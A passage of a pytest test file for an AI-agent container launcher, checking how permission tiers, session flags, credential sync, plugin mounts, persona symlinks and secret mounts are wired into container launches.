    def test_persisted_access_editing_emits_accept_edits(self, start_mocks):
        """The MIDDLE tier through the REAL launch path (R-41): the argv carries
        acceptEdits and NOT the bypass."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "access": "editing"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--dangerously-skip-permissions" not in cli_args
            assert "--permission-mode" in cli_args
            assert cli_args[cli_args.index("--permission-mode") + 1] == "acceptEdits"

    def test_autonomous_flag_overrides_persisted_restricted(self, start_mocks):
        """-A (autonomous) WINS over a persisted ``restricted`` -> bypass PRESENT."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "access": "restricted"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                autonomous=True, extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--dangerously-skip-permissions" in cli_args

    def test_secure_flag_overrides_persisted_full(self, start_mocks):
        """-S (secure) WINS over a persisted ``full`` -> bypass ABSENT."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "access": "full"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=True, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--dangerously-skip-permissions" not in cli_args

    def test_flags_do_NOT_reach_the_projected_surface(self, start_mocks):
        """⚑ Spec §1A's PROJECTED-SURFACE exception, on the real launch path:
        ``-S``/``-A`` fold into the ARGV only.  The panel delivery — which writes
        a file that OUTLIVES this launch — gets the CASCADE tier, so a transient
        flag can never mutate persisted permission state.
        """
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "access": "editing"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=True, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            # -S folded into the ARGV: restricted (nothing emitted).
            assert "--dangerously-skip-permissions" not in cli_args
            assert "--permission-mode" not in cli_args
            # ...while the PROJECTION still got the stored tier.
            m.target.deliver_panel_permissions.assert_called_once_with(
                config_root=m.proj.shell_path, access="editing",
            )

    def test_unknown_stored_tier_refuses_the_launch(self, start_mocks):
        """R-41's inversion: a junk stored value used to coerce to the PERMISSIVE
        default.  It now stops the launch — the container is never run."""
        from kanibako.errors import ConfigError

        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "access": "bogus"}
            with pytest.raises(ConfigError):
                _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            m.runtime.run.assert_not_called()

    def test_a_tier_the_agent_cannot_render_refuses_the_launch(self, start_mocks):
        """The un-rendered-tier gate, on the real launch path: goose + ``editing``
        stops BEFORE any delivery (the panel seams are best-effort and would
        swallow the refusal), so no projection is written either."""
        from kanibako.errors import ConfigError
        from kanibako.plugins.goose.target import GooseTarget

        with start_mocks() as m:
            self._drive(m)
            m.resolve_agent.return_value = _sel("goose")
            m.target.name = "goose"
            m.target.descriptor = GooseTarget().descriptor
            m.agent_cfg.state = {"access": "editing"}
            with pytest.raises(ConfigError) as exc:
                _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert "restricted | full" in str(exc.value)
            m.target.deliver_panel_permissions.assert_not_called()
            m.runtime.run.assert_not_called()

    def test_new_session_drops_continue(self, start_mocks):
        with start_mocks() as m:
            self._drive(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=True, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--continue" not in cli_args
            assert "--resume" not in cli_args

    def test_resume_mode_falls_through_to_continue(self, start_mocks):
        # Resume was cut from claude's descriptor (user 2026-06-17); -R has no
        # "resume" mode key to select, so it falls through to --continue.
        with start_mocks() as m:
            self._drive(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=True,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--continue" in cli_args
            assert "--resume" not in cli_args

    def test_persisted_continue_mode_false_starts_fresh(self, start_mocks):
        """Persisted ``agent.default.continue_mode=false`` (no -N/-C/-R) resolves off
        the snapshot via effective_behavior -> FRESH -> ``--continue`` ABSENT. This is
        the whole point of the continue_mode BUILD (the writer now has a reader):
        the negative direction the unset->default-True case cannot cover (a stuck-True
        mutation dropping the ``_cm`` read would leave --continue and redden HERE)."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "continue_mode": "false"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--continue" not in cli_args
            assert "--resume" not in cli_args

    def test_continue_flag_overrides_persisted_false(self, start_mocks):
        """-C (continue_override) WINS over a persisted continue_mode=false ->
        ``--continue`` PRESENT (the per-launch flag overrides the persisted key)."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "continue_mode": "false"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, continue_override=True, safe_mode=False,
                resume_mode=False, extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--continue" in cli_args

    def test_new_flag_overrides_persisted_continue_true(self, start_mocks):
        """-N WINS over a persisted continue_mode=true -> ``--continue`` ABSENT."""
        with start_mocks() as m:
            self._drive(m)
            m.agent_cfg.state = {"model": "opus", "continue_mode": "true"}
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=True, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--continue" not in cli_args

    def test_descriptor_delivery_mounts_used_not_binary_mounts(self, start_mocks):
        """Descriptor path builds delivery mounts via descriptor_mounts, not
        target.binary_mounts (which stays for the helper hub only)."""
        with start_mocks() as m:
            self._drive(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            mounts = m.runtime.run.call_args.kwargs.get("extra_mounts") or []
            dests = {getattr(mt, "destination", None) for mt in mounts}
            assert "/home/agent/.local/share/claude" in dests
            assert "/home/agent/.local/bin/claude" in dests


class TestInstructionDeliveryActivation:
    """Increment 2b: the SEED env var (global) + the goose launch-flatten gate."""

    def _drive_claude(self, m):
        from kanibako.plugins.claude.target import _CLAUDE_DESCRIPTOR
        m.target.name = "claude"
        m.target.descriptor = _CLAUDE_DESCRIPTOR
        m.target.setting_descriptors.return_value = []
        m.agent_cfg.state = {"model": "opus"}
        m.load_agent_config.return_value = m.agent_cfg

    def _drive_goose(self, m):
        from kanibako.plugins.goose.target import _GOOSE_DESCRIPTOR
        m.target.name = "goose"
        m.target.descriptor = _GOOSE_DESCRIPTOR
        m.target.default_entrypoint = "goose"
        m.target.setting_descriptors.return_value = []
        m.agent_cfg.state = {}
        m.load_agent_config.return_value = m.agent_cfg

    def test_seed_env_var_injected_absolute(self, start_mocks):
        """KANIBAKO_DIRECTIVE_SEED is stamped GLOBALLY as a box-ABSOLUTE path."""
        with start_mocks() as m:
            self._drive_claude(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert (
                env.get("KANIBAKO_DIRECTIVE_SEED")
                == "/home/agent/.config/kanibako/kickoff.md"
            )

    def test_goose_launch_wraps_entrypoint_with_flatten(self, start_mocks):
        """goose launch nests the flatten shim: entrypoint→sh, script flattens the
        SEED into the FINAL slot, then exec's goose."""
        with start_mocks() as m:
            self._drive_goose(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            kw = m.runtime.run.call_args.kwargs
            assert kw.get("entrypoint") == "sh"
            cli_args = kw.get("cli_args") or []
            assert cli_args[0] == "-c"
            script = cli_args[1]
            assert "import-directives.py" in script
            assert '"$KANIBAKO_DIRECTIVE_SEED" "$KANIBAKO_DIRECTIVE_FINAL"' in script
            assert "--additional-context" not in script  # goose = FILE-write mode
            assert 'exec "$@"' in script
            # $@ still runs goose after the flatten.
            assert "goose" in cli_args[2:]

    def test_claude_launch_wraps_entrypoint_with_flatten(self, start_mocks):
        """claude ALSO nests the flatten shim now (DEFAULT for all agents,
        2026-07-12): the launch-flatten writes the SEED into claude's
        ~/.claude/CLAUDE.md FINAL slot — the native, uncapped channel — before
        exec.  (The additionalContext hook is kept as a secondary channel.)"""
        with start_mocks() as m:
            self._drive_claude(m)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            kw = m.runtime.run.call_args.kwargs
            cli_args = kw.get("cli_args") or []
            # claude now gets the launch-flatten too (no more goose-only gate).
            assert any("import-directives.py" in str(a) for a in cli_args)


class TestPluginsAndCacheShares:
    """Part 3a: claude's ``plugins`` + ``cache`` are AGENT-scope ``common``
    category entries (the plugin's ``default_common()``), ROOTED AT DECLARATION at
    ``@meta.agent.claude.path/common`` = ``<data>/agents/claude/common`` and bound
    rw to ``~/.claude/{plugins,cache}``.

    Driven through the LIVE single-route path (7c): the claude ``default_common()``
    table resolved via ``build_launch_snapshot`` (``_resolve_launch_snapshot``) and
    emitted via ``_emit_category_mounts`` with a REAL ``std``, so the STORED
    ``@meta.agent.claude.path/common/<leaf>`` ref must actually resolve (the
    ``meta.agent.<a>.path`` anchor + the ``@config.agents`` chain) and the host
    paths + L7 guarantee-create are exercised end-to-end.

    ⚑ There is NO root-join left to exercise (P3 deleted ``scope_roots``); these
    assert the DECLARED ref resolving.  The ``common/`` segment in the expected
    paths is P3's one intended path move (M-3).
    """

    _PLUGINS_DEST = "/home/agent/.claude/plugins"
    _CACHE_DEST = "/home/agent/.claude/cache"

    def _proj(self, std):
        from kanibako.settings.paths import ProjectGroup
        proj = MagicMock()
        proj.group = ProjectGroup(
            name="default", root=std.data, is_default=True,
            local_shared_base=std.data,
        )
        # Default/PRIMARY mode (B1: meta.runtime.* needs a real mode; primary uses
        # the @config.primary_workset @-ref so project_path is unused here).
        proj.mode = BoxMode.primary
        proj.project_path = std.data
        proj.enable_vault = False
        # B2: meta.box.* identity anchors need a real box name (proj.name) for the
        # channel partition addresses (box_channel_addresses).
        proj.name = "claudebox"
        return proj

    def _build(self, std, config_file, tmp_path):
        from kanibako.commands.start import (
            _emit_category_mounts,
            _resolve_launch_snapshot,
        )
        from kanibako.plugins.claude.target import ClaudeTarget

        target = ClaudeTarget()
        # NARROW snapshot resolve: inject ONLY the claude agent ``common`` entries
        # (declaration-rooted sources + L7 guarantee-create exercised here), not the
        # core/channel families. ``default_common()`` is the claude plugin's
        # agent-scope ``common`` table (plugins/cache under
        # ``@meta.agent.claude.path/common``). All scope files are absent (None) —
        # this isolates the agent-scope category resolution.
        _snap, reconciled = _resolve_launch_snapshot(
            std=std,
            proj=self._proj(std),
            agent_name="claude",
            system_settings_path=None,
            agent_cfg_path=None,
            desc=None,
            install=None,
            target=target,
            agent_cfg=None,
            include_base_families=False,
            extra_default_categories=target.default_common(),
            deliver_creds=True,
        )
        return _emit_category_mounts(reconciled, label="share")

    def _by_dest(self, mounts, dest):
        return [mt for mt in mounts if getattr(mt, "destination", None) == dest]

    def test_plugins_mounted_from_agent_store(self, std, config_file, tmp_path):
        mounts = self._build(std, config_file, tmp_path)
        pm = self._by_dest(mounts, self._PLUGINS_DEST)
        assert len(pm) == 1
        assert pm[0].source == std.agents / "claude" / "common" / "plugins"
        assert pm[0].options == "Z,U"  # rw
        # Host source guarantee-created (L7) so podman binds a real persistent dir.
        assert (std.agents / "claude" / "common" / "plugins").is_dir()

    def test_cache_mounted_from_agent_store(self, std, config_file, tmp_path):
        mounts = self._build(std, config_file, tmp_path)
        cm = self._by_dest(mounts, self._CACHE_DEST)
        assert len(cm) == 1
        assert cm[0].source == std.agents / "claude" / "common" / "cache"
        assert cm[0].options == "Z,U"  # rw
        assert (std.agents / "claude" / "common" / "cache").is_dir()

    def test_single_mount_per_dest(self, std, config_file, tmp_path):
        mounts = self._build(std, config_file, tmp_path)
        assert len(self._by_dest(mounts, self._PLUGINS_DEST)) == 1
        assert len(self._by_dest(mounts, self._CACHE_DEST)) == 1


class TestPersonaShareSymlinks:
    """Block D: ``ensure_persona_share_symlinks`` lays a symlink shim so a PERSONA
    node (``navigator℘claude``) shares the harness's ``agents/claude/{plugins,
    cache}`` instead of getting its own empty dirs.  Bare (node == harness) is a
    no-op (byte-identical to every existing agent path)."""

    _HARNESS = "claude"
    _NODE = "navigator℘claude"

    def _target(self, common_binds=None):
        """A stand-in target returning the REAL ``default_common()`` SHAPE.

        ⚑ The values are the DECLARATION-ROOTED ``@``-refs the live claude plugin
        emits, NOT the pre-P3 bare leaves.  A fixture carrying the old shape kept
        every test in this class green while production built a garbage path out of
        the ref (see ``test_links_are_under_the_common_dir``) — a stale fixture
        masking a real regression is worse than no fixture, so this one is
        cross-checked against the live plugin by
        ``test_fixture_shape_matches_the_live_plugin``.
        """
        from types import SimpleNamespace
        if common_binds is None:
            common_binds = {
                "agent.claude.common.plugins": (
                    "@meta.agent.claude.path/common/plugins",
                    "/home/agent/.claude/plugins",
                ),
                "agent.claude.common.cache": (
                    "@meta.agent.claude.path/common/cache",
                    "/home/agent/.claude/cache",
                ),
            }
        return SimpleNamespace(
            name=self._HARNESS, default_common=lambda: common_binds
        )

    def test_fixture_shape_matches_the_live_plugin(self):
        """The fixture above cannot silently rot: it must equal what the REAL
        claude plugin declares, key-for-key and value-for-value."""
        from kanibako.plugins.claude import ClaudeTarget

        assert self._target().default_common() == ClaudeTarget().default_common()

    def _std(self, tmp_path):
        from types import SimpleNamespace
        agents = tmp_path / "agents"
        agents.mkdir()
        return SimpleNamespace(agents=agents)

    def test_links_are_under_the_common_dir(self, tmp_path):
        """T7 — the shim reads the REAL (declaration-rooted) ``common`` shape.

        ⚑ THIS IS THE ONE THAT CAUGHT THE BREAKAGE.  The shim used to build its
        paths from the ``host_src`` VALUE, which was a bare leaf (``plugins``).
        After P3 that value is ``@meta.agent.claude.path/common/plugins``, so the
        old code would have created the literal directory
        ``agents/<node>/@meta.agent.claude.path/common/plugins`` — a garbage path —
        while every OTHER test in this class stayed green on a stale fixture that
        still returned the bare leaf.  The leaf now comes from the KEY
        (``agent.<a>.common.<leaf>``) and both sides are built from the SAME layout
        helper the ref builder uses, so the two cannot drift.

        (Mutation: derive the leaf from ``host_src`` again → the ``@``-ref becomes
        a path component → RED.)
        """
        from kanibako.commands.start import ensure_persona_share_symlinks

        std = self._std(tmp_path)
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        for name in ("plugins", "cache"):
            node_link = std.agents / self._NODE / "common" / name
            harness_dir = std.agents / self._HARNESS / "common" / name
            assert node_link.is_symlink(), f"{name}: no link at {node_link}"
            assert harness_dir.is_dir(), f"{name}: no harness dir at {harness_dir}"
            assert node_link.readlink() == harness_dir
        # And NOTHING was created from the raw @-ref value.
        assert not any(
            "@" in p.name for p in (std.agents / self._NODE).rglob("*")
        ), sorted(str(p) for p in (std.agents / self._NODE).rglob("*"))

    # --- persona: symlinks created, harness dir first, no dangling -------------

    def test_persona_symlinks_created_for_each_share(self, tmp_path):
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        for name in ("plugins", "cache"):
            node_link = std.agents / self._NODE / "common" / name
            harness_dir = std.agents / self._HARNESS / "common" / name
            assert node_link.is_symlink(), f"{name} not a symlink"
            # Harness dir made FIRST -> the link is NOT dangling.
            assert harness_dir.is_dir(), f"harness {name} dir missing"
            assert node_link.resolve() == harness_dir.resolve()
            assert node_link.readlink() == harness_dir

    def test_persona_idempotent_second_call_noop(self, tmp_path):
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        before = {
            name: (std.agents / self._NODE / "common" / name).readlink()
            for name in ("plugins", "cache")
        }
        # Second call: still symlinks, same target (no clobber, no error).
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        for name in ("plugins", "cache"):
            link = std.agents / self._NODE / "common" / name
            assert link.is_symlink()
            assert link.readlink() == before[name]

    def test_persona_real_dir_at_node_left_alone(self, tmp_path):
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        # A persona that legitimately has its OWN real plugins dir.
        real = std.agents / self._NODE / "common" / "plugins"
        real.mkdir(parents=True)
        (real / "sentinel.txt").write_text("mine")
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        # NOT clobbered: still a real dir with its sentinel.
        assert real.is_dir() and not real.is_symlink()
        assert (real / "sentinel.txt").read_text() == "mine"
        # The OTHER share (cache) still got its symlink.
        cache_link = std.agents / self._NODE / "common" / "cache"
        assert cache_link.is_symlink()

    def test_persona_wrong_target_symlink_left_alone(self, tmp_path):
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        # Pre-existing symlink pointing somewhere ELSE (not the harness dir).
        elsewhere = tmp_path / "elsewhere_plugins"
        elsewhere.mkdir()
        node_link = std.agents / self._NODE / "common" / "plugins"
        node_link.parent.mkdir(parents=True)
        node_link.symlink_to(elsewhere)
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        # LEFT alone: still points at ``elsewhere``, not the harness dir.
        assert node_link.is_symlink()
        assert node_link.readlink() == elsewhere

    # --- bare (node == harness): strict no-op -------------------------------

    def test_bare_agent_is_noop(self, tmp_path):
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        ensure_persona_share_symlinks(std, self._HARNESS, self._target())
        # Mutation-check: NOTHING created for a bare agent — no node dir, no
        # harness common dirs, no symlink.  (If the helper failed to early-return,
        # it would have made agents/claude/common/{plugins,cache}.)
        assert not (std.agents / self._HARNESS).exists()
        assert list(std.agents.iterdir()) == []

    def test_bare_agent_noop_even_with_shares(self, tmp_path):
        # Same as above but proves the guard is on node==harness, not on empty
        # ``common`` entries: a fully-declared target still yields no dirs for bare.
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        target = self._target()
        ensure_persona_share_symlinks(std, self._HARNESS, target)
        assert list(std.agents.iterdir()) == []

    def test_none_target_is_noop(self, tmp_path):
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        ensure_persona_share_symlinks(std, self._NODE, None)
        assert list(std.agents.iterdir()) == []

    # --- ORDERING: the L7 guarantee-create is a no-op on the symlink --------

    def test_guarantee_create_mkdir_does_not_clobber_symlink(self, tmp_path):
        """The share source guarantee-create later runs
        ``Path.mkdir(parents=True, exist_ok=True)`` on the rw source.  On our
        symlink-to-existing-dir that is a silent no-op (verified here), so the
        harness dir stays the real writeback target."""
        from kanibako.commands.start import ensure_persona_share_symlinks
        std = self._std(tmp_path)
        ensure_persona_share_symlinks(std, self._NODE, self._target())
        node_link = std.agents / self._NODE / "common" / "plugins"
        # Simulate the L7 guarantee-create on the (already-symlinked) source.
        node_link.mkdir(parents=True, exist_ok=True)
        assert node_link.is_symlink()  # NOT replaced by a real dir
        assert node_link.resolve() == (
            std.agents / self._HARNESS / "common" / "plugins"
        ).resolve()


class TestCredsyncRouting:
    """Step 1f: descriptor-bearing targets route their credential lifecycle
    (init / pre-launch refresh / post-session writeback) through the credsync
    engine; non-descriptor (legacy) targets keep the per-plugin
    init_home / refresh_credentials / writeback_credentials hooks.
    """

    def _drive_descriptor(self, m):
        """Configure the mock target onto claude's REAL descriptor path."""
        from kanibako.plugins.claude.target import _CLAUDE_DESCRIPTOR
        m.target.name = "claude"
        m.target.descriptor = _CLAUDE_DESCRIPTOR
        m.target.setting_descriptors.return_value = []
        m.agent_cfg.state = {"model": "opus"}
        m.load_agent_config.return_value = m.agent_cfg

    # ---- descriptor path: credsync engine is used, legacy hooks bypassed ----

    def test_descriptor_init_uses_seed_cred_files(self, start_mocks):
        """New descriptor-bearing project: seed_box_credentials invoked with the
        descriptor/target/auth/host_home/project_home, and the legacy
        init_home hook is NOT called."""
        with start_mocks() as m:
            self._drive_descriptor(m)
            # Seed-at-create path: a brand-new (just-registered) box seeds now.
            m.proj.is_new = True
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m_credsync.seed_box_credentials.assert_called_once()
            call = m_credsync.seed_box_credentials.call_args
            assert call.args[0] is m.target.descriptor
            assert call.args[1] is m.target
            assert call.kwargs["project_home"] is m.proj.shell_path
            assert call.kwargs["auth"].creds_shared is True
            from pathlib import Path
            assert call.kwargs["host_home"] == Path.home()

    def test_descriptor_refresh_uses_refresh_cred_files(self, start_mocks):
        """Pre-launch (shared auth): refresh_box_credentials invoked, legacy
        refresh_credentials NOT called."""
        with start_mocks() as m:
            self._drive_descriptor(m)
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m_credsync.refresh_box_credentials.assert_called_once()
            call = m_credsync.refresh_box_credentials.call_args
            assert call.args[0] is m.target.descriptor
            assert call.kwargs["project_home"] is m.proj.shell_path
            assert call.kwargs["auth"].creds_shared is True
            m.target.refresh_credentials.assert_not_called()

    def test_descriptor_writeback_uses_writeback_cred_files(self, start_mocks):
        """Post-session (non-persistent, shared auth): writeback_box_credentials
        invoked, legacy writeback_credentials NOT called."""
        with start_mocks() as m:
            self._drive_descriptor(m)
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], persistent=False,
                )
            assert rc == 0
            m_credsync.writeback_box_credentials.assert_called_once()
            call = m_credsync.writeback_box_credentials.call_args
            assert call.args[0] is m.target.descriptor
            assert call.kwargs["project_home"] is m.proj.shell_path
            assert call.kwargs["auth"].creds_shared is True
            m.target.writeback_credentials.assert_not_called()

    def test_descriptor_reattach_refresh_uses_refresh_cred_files(self, start_mocks):
        """Persistent reattach (container already running): the short-circuit
        refresh routes through refresh_box_credentials, not refresh_credentials."""
        with start_mocks() as m:
            self._drive_descriptor(m)
            m.runtime.is_running.return_value = True
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], persistent=True,
                )
            assert rc == 0
            m_credsync.refresh_box_credentials.assert_called_once()
            m.target.refresh_credentials.assert_not_called()

    def test_descriptor_distinct_auth_still_seeds_but_skips_sync(self, start_mocks):
        """PRIVATE box (auth_src.creds_shared False): init still seeds (the orchestrator
        creates the box home/dirs; a private tier seeds no cred content), but
        refresh/writeback are gated out by the ``auth_src.creds_shared`` guard
        (credsync.refresh/writeback never reached)."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(_PRIVATE_AUTH, None, None),
        ):
            self._drive_descriptor(m)
            # Seed-at-create path: a brand-new (just-registered) box seeds now.
            m.proj.is_new = True
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            # seed_box_credentials runs on init regardless of tier (it creates the
            # box home dirs; a private tier seeds no cred content internally); but
            # the auth_src.creds_shared guard skips refresh/writeback.
            m_credsync.seed_box_credentials.assert_called_once()
            assert m_credsync.seed_box_credentials.call_args.kwargs["auth"].creds_shared is False
            m_credsync.refresh_box_credentials.assert_not_called()
            m_credsync.writeback_box_credentials.assert_not_called()

    # ---- legacy path: per-plugin hooks still used, credsync untouched -------

    def test_legacy_init_seeds_nothing(self, start_mocks):
        """Non-descriptor target (descriptor=None, the conftest default): init
        seeds NOTHING.  The vestigial init_home hook was removed in 1.6.0, and a
        descriptor-less target has no creds to seed, so credsync.seed_box_credentials
        is NOT called (its dirs come from the layered template apply)."""
        with start_mocks() as m:
            m.target.descriptor = None
            m.proj.is_new = True
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m_credsync.seed_box_credentials.assert_not_called()

    def test_legacy_refresh_uses_refresh_credentials(self, start_mocks):
        """Non-descriptor target: pre-launch refresh calls the legacy
        refresh_credentials hook, credsync.refresh_box_credentials NOT called."""
        with start_mocks() as m:
            m.target.descriptor = None
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m.target.refresh_credentials.assert_called_once()
            m_credsync.refresh_box_credentials.assert_not_called()

    def test_legacy_writeback_uses_writeback_credentials(self, start_mocks):
        """Non-descriptor target: post-session writeback calls the legacy
        writeback_credentials hook, credsync.writeback_box_credentials NOT called."""
        with start_mocks() as m:
            m.target.descriptor = None
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], persistent=False,
                )
            assert rc == 0
            m.target.writeback_credentials.assert_called_once()
            m_credsync.writeback_box_credentials.assert_not_called()


class TestAgentConfigIntegration:
    """Verify agent config integration in _run_container."""

    def test_default_args_merged_into_cli(self, start_mocks):
        """Agent default_args are prepended to extra_args.

        Descriptor path: assembly appends ``run_args + extra_args`` last in the
        agent argv, so both reach runtime.run's cli_args in order.
        """
        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            m.agent_cfg.run_args = ["--verbose"]
            m.load_agent_config.return_value = m.agent_cfg
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=["--foo"],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            # run_args precede extra_args, both appended after the assembled flags.
            assert cli_args[-2:] == ["--verbose", "--foo"]

    def test_apply_state_called(self, start_mocks):
        """Crab state drives the agent argv via the descriptor (model -> --model).

        The legacy apply_state hook is no longer dispatched; the model state
        value is emitted as ``--model <value>`` by assembly's SettingArg path.
        """
        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            m.agent_cfg.state = {"model": "opus"}
            m.load_agent_config.return_value = m.agent_cfg
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert cli_args[cli_args.index("--model") + 1] == "opus"
            # The legacy hook is bypassed on the descriptor path.
            m.target.apply_state.assert_not_called()

    def test_state_args_appended_to_cli(self, start_mocks):
        """State-derived flags (model) reach the final cli_args via assembly."""
        with start_mocks() as m:
            m.target.setting_descriptors.return_value = []
            m.agent_cfg.state = {"model": "opus"}
            m.load_agent_config.return_value = m.agent_cfg
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert "--model" in cli_args
            assert "opus" in cli_args

    def test_agent_env_merged_into_container_env(self, start_mocks):
        """Agent [env] section values are included in container env."""
        with start_mocks() as m:
            m.agent_cfg.env = {"MY_VAR": "hello"}
            m.load_agent_config.return_value = m.agent_cfg
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            env = m.runtime.run.call_args.kwargs.get("env") or {}
            assert env.get("MY_VAR") == "hello"

    def test_secret_path_delivered_arms_length_mount_and_shim(
        self, start_mocks, tmp_path,
    ):
        """SECRET category (secret_path): the active agent's pointer → a ro MOUNT to
        /run/kanibako/secrets/<VAR> + an in-box export shim. The VALUE is NEVER read
        into the container env nor onto the podman argv (only the mount PATH is)."""
        from kanibako.settings.settings_categories import SECRET_MOUNT_DIR

        tok = tmp_path / "token"
        tok.write_text("sk-persona-bearer\n")
        with start_mocks() as m:
            m.agent_cfg.secret_path = {"ANTHROPIC_AUTH_TOKEN": str(tok)}
            m.load_agent_config.return_value = m.agent_cfg
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            kw = m.runtime.run.call_args.kwargs
            # The secret VALUE is NOT in the container env (arm's-length).
            env = kw.get("env") or {}
            assert "ANTHROPIC_AUTH_TOKEN" not in env
            assert "sk-persona-bearer" not in "".join(str(v) for v in env.values())
            # A ro mount of the host PATH to SECRET_MOUNT_DIR/<VAR> (only the PATH).
            mounts = kw.get("extra_mounts") or []
